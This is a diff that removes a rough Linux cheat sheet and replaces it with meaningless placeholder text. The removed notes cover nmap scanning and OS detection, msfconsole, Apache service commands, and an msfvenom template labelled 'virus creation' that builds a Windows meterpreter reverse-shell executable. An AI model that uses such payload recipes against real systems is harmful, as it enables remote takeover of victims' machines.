@@ -1,29 +1,4 @@
 $$linux$$
 
-IPINFO :ifconfig
-
-
-
-TO VIEW NMAP COMMANDS:	nmap --help
-
-PORT NMAP TOP VIEWER :	nmap --top-ports ...(number of ports")...link
-
-OPEN PORTS FILTERD:	nmap ...link...
-
-NMAP OS DETECTION : nmap ...ip.... -O
-
-NMAP AGGRESIVE OS DETECTION : NMAP ..IP..-O -osscan-guess
-
-
-
-PORT CONNECT:	..port name.. link 
-
-METASPLOIT VIRUS CREATION:	msfvenom -p windows/meterpreter/reverse_tcp..<-name of payload....LHOST=...ip...LPORT....portno... --format =...exe or any.. >..nameof virus.. .exe
-
-CONSOLE METASPLOIT:	msfconsole
-
-APACHE SERVER:	service apache2 start
-
-APACHE SATAUS:	service  apache2 status
-
-
+random:uiop
+RTY:	asdf
